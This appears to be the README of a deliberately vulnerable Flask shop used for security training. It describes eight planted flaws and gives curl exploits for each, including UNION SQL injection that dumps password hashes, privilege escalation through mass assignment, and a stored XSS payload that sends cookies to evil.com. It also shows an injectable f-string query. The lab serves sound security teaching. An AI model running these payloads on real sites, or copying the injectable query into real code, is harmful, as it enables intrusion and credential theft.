# Khmer Store — Web Security Lab

A **deliberately vulnerable** Cambodian e-commerce web application built with Flask for security training and penetration testing practice.

> **WARNING:** This application contains intentional security vulnerabilities. NEVER deploy in production. For educational and authorized testing purposes only.

---

## Vulnerabilities (8 Total)

| # | Vulnerability | OWASP Category | Severity | Endpoint |
|---|--------------|----------------|----------|----------|
| 1 | IDOR — User Data Exposure | A01:2021 Broken Access Control | Critical | `GET /api/users/<id>` |
| 2 | Mass Assignment — Privilege Escalation | A01:2021 Broken Access Control | Critical | `POST /api/account/update` |
| 3 | SQL Injection | A03:2021 Injection | Critical | `GET /api/products/search` |
| 4 | Stored XSS | A03:2021 Injection | High | `POST /api/products/<id>/reviews` |
| 5 | IDOR — Order Access | A01:2021 Broken Access Control | High | `GET /api/orders/<id>` |
| 6 | Information Disclosure | A04:2021 Insecure Design | High | `GET /health`, `GET /api/users/<id>` |
| 7 | Weak Password Policy | A07:2021 Auth Failures | Medium | `POST /api/register` |
| 8 | Unauthenticated Log Access | A01:2021 Broken Access Control | Medium | `GET /api/logs` |

---

## Vulnerability Details

### 1. IDOR — User Data Exposure (Critical)

**Endpoint:** `GET /api/users/<id>`

Any authenticated user can access any other user's data by changing the `user_id` in the URL. No ownership verification is performed.

**Response exposes sensitive fields:**
- `password_hash` — bcrypt hash of the user's password
- `verification_code` — account verification code

**Exploit:**
```bash
# Login as any user
curl -c cookies.txt -X POST http://TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"sokha","password":"password123"}'

# Access admin user data (ID=3 for dara)
curl -b cookies.txt http://TARGET/api/users/3
# Response includes password_hash and verification_code
```

---

### 2. Mass Assignment — Privilege Escalation (Critical)

**Endpoint:** `POST /api/account/update`

The endpoint accepts a `role` field from the client and writes it directly to the database. Any user can escalate to admin.

**Exploit:**
```bash
curl -b cookies.txt -X POST http://TARGET/api/account/update \
  -H "Content-Type: application/json" \
  -d '{"name":"hacker","email":"hacker@evil.com","role":"admin"}'

# Now access admin panel
curl -b cookies.txt http://TARGET/api/admin/users
```

---

### 3. SQL Injection (Critical)

**Endpoint:** `GET /api/products/search?q=<payload>`

User input is directly concatenated into SQL queries with no parameterization or sanitization.

**Exploit — Dump all users:**
```bash
curl "http://TARGET/api/products/search?q=' UNION SELECT id,username,email,password_hash,name,role,verified,verification_code,created_at FROM users--"
```

**Exploit — Extract password hashes:**
```bash
curl "http://TARGET/api/products/search?q=' UNION SELECT 1,password_hash,3,4,5,6,7,8,9 FROM users--"
```

**Vulnerable code:**
```python
sql = f"SELECT * FROM products WHERE name LIKE '%{query}%'"
cursor.execute(sql)
```

---

### 4. Stored XSS (High)

**Endpoint:** `POST /api/products/<id>/reviews`

Review text is stored and returned without any HTML escaping or sanitization. Malicious scripts execute in other users' browsers.

**Exploit:**
```bash
curl -b cookies.txt -X POST http://TARGET/api/products/1/reviews \
  -H "Content-Type: application/json" \
  -d '{"review":"<script>document.location=\"http://evil.com/steal?c=\"+document.cookie</script>","rating":5}'

# Any user viewing reviews gets cookies stolen
curl http://TARGET/api/products/1/reviews
```

---

### 5. IDOR — Order Access (High)

**Endpoint:** `GET /api/orders/<id>`, `DELETE /api/orders/<id>`

No ownership check on orders. Any authenticated user can view or delete any order by iterating order IDs.

**Exploit:**
```bash
# View other users' orders
curl -b cookies.txt http://TARGET/api/orders/1
curl -b cookies.txt http://TARGET/api/orders/2

# Delete other users' orders
curl -b cookies.txt -X DELETE http://TARGET/api/orders/1
```

---

### 6. Information Disclosure (High)

**Endpoint:** `GET /health`

The health endpoint exposes sensitive server configuration:
- `secret_key` — Flask session signing key (allows session forgery)
- `server_ip` — internal IP address
- `session_config` — cookie security settings
- `python_version`, `flask_version` — software versions

**Exploit:**
```bash
curl http://TARGET/health
# Returns {"secret_key": "abc123...", "server_ip": "192.168.1.20", ...}
```

---

### 7. Weak Password Policy (Medium)

**Endpoint:** `POST /api/register`

Minimum password length is only 1 character. No complexity requirements, no common password checks.

**Exploit:**
```bash
curl -X POST http://TARGET/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"weak","email":"weak@test.com","password":"a","name":"Weak"}'
# Account created successfully
```

---

### 8. Unauthenticated Log Access (Medium)

**Endpoint:** `GET /api/logs`

Request logs are accessible without any authentication, exposing user activity and internal request details.

**Exploit:**
```bash
curl http://TARGET/api/logs
# Returns all request logs including usernames and IP addresses
```

---

## Setup

### Prerequisites

- Python 3.10+
- pip

### Install & Run

```bash
# Clone repository
git clone https://github.com/khmersec/khmer-store-lab.git
cd khmer-store-lab

# Install dependencies
pip install -r requirements.txt

# Run the vulnerable application
python app.py
```

Server starts on `http://localhost:80`

### Run Secure Version (for comparison)

```bash
python app_secure.py
```

---

## Pages

| Page | URL | Description |
|------|-----|-------------|
| Home | `/` | Landing page with featured products |
| Products | `/products` | All 18 products |
| Register | `/register` | Create account |
| Login | `/login` | Login |
| Verify | `/verify` | Verify account with code |
| Account | `/account` | Orders and account info |
| Profile | `/profile` | Profile settings |
| Admin | `/admin` | Admin dashboard (admin only) |

---

## API Endpoints

| Endpoint | Method | Auth | Vulnerable |
|----------|--------|------|-----------|
| `/api/register` | POST | No | Weak password policy |
| `/api/verify` | POST | No | - |
| `/api/login` | POST | No | No rate limiting |
| `/api/logout` | POST | Yes | - |
| `/api/profile` | GET | Yes | - |
| `/api/profile/name` | POST | Yes | - |
| `/api/account/update` | POST | Yes | Mass assignment |
| `/api/products` | GET | No | - |
| `/api/products/<id>` | GET | No | - |
| `/api/products/search` | GET | No | SQL injection |
| `/api/products/<id>/reviews` | POST | Yes | Stored XSS |
| `/api/products/<id>/reviews` | GET | No | Reflected XSS |
| `/api/users/<id>` | GET | Yes | IDOR + Info disclosure |
| `/api/orders` | POST | Yes | - |
| `/api/orders` | GET | Yes | - |
| `/api/orders/<id>` | GET | Yes | IDOR |
| `/api/orders/<id>` | DELETE | Yes | IDOR |
| `/api/admin/stats` | GET | Admin | - |
| `/api/admin/users` | GET | Admin | - |
| `/api/admin/orders` | GET | Admin | - |
| `/api/logs` | GET | No | Unauthenticated access |
| `/health` | GET | No | Info disclosure |

---

## Default Test Users

| Username | Password | Role |
|----------|----------|------|
| sokha | password123 | user |
| bopha | password123 | user |
| dara | password123 | admin |
| chantha | password123 | user |
| sophea | password123 | user |

---

## Project Structure

```
khmer-store-lab/
├── app.py              # Vulnerable Flask application
├── app_secure.py       # Secure version (for comparison)
├── database.py         # SQLite database module
├── requirements.txt    # Python dependencies
├── README.md           # This file
├── khmer_store.db      # SQLite database (auto-created)
├── templates/          # HTML templates
│   ├── index.html
│   ├── register.html
│   ├── login.html
│   ├── verify.html
│   ├── profile.html
│   ├── products.html
│   ├── account.html
│   └── admin.html
└── static/             # Static assets
    └── style.css
```

---

## Recommended Lab Exercises

1. **IDOR** — Access `/api/users/1` through `/api/users/10` and extract all password hashes
2. **Privilege Escalation** — Register as a normal user, then use mass assignment to become admin
3. **SQL Injection** — Use UNION-based injection to dump the users table from the search endpoint
4. **XSS** — Inject a script tag in a product review that steals cookies
5. **Chain Attack** — Use IDOR to get the admin's verification code, then access admin panel

---

## Disclaimer

This application is designed for cybersecurity education and authorized penetration testing only. Users are responsible for using this software in compliance with all applicable laws and regulations.

---

## License

MIT License — Educational Use Only
